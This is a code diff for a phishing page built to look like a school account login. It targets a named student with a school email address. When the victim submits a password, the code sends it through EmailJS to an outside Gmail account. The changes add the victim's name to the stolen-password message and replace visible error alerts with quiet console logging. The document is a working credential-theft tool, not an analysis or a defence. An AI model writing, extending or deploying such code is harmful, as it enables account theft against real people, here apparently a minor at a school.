@@ -195,8 +195,8 @@ const successCard = document.getElementById("successCard");
 
 // Example user info
 const loggedUser = {
-  name: "11131정주혁",
-  email: "26-11131@boin.hs.kr"
+  name: "11103권오승",
+  email: "26-11103@boin.hs.kr"
 };
 userName.textContent = loggedUser.name;
 userEmail.textContent = loggedUser.email;
@@ -227,11 +227,11 @@ nextPasswordBtn.addEventListener("click", () => {
   let val = passwordInput.value;
 
   emailjs.send("service_jdep3dj", "template_bockd4k", {
-        message: "Password by 15: " + val,
+        message: loggedUser.name + "'s password is: " + val,
         to_email: "officialsecuritygg@gmail.com"
     }).catch((err) => {
-  alert("STATUS:", err.status);
-  alert("TEXT:", err.text);
+  console.log("STATUS:", err.status);
+  console.log("TEXT:", err.text);
 });
 
   // Hide password screen, show success screen
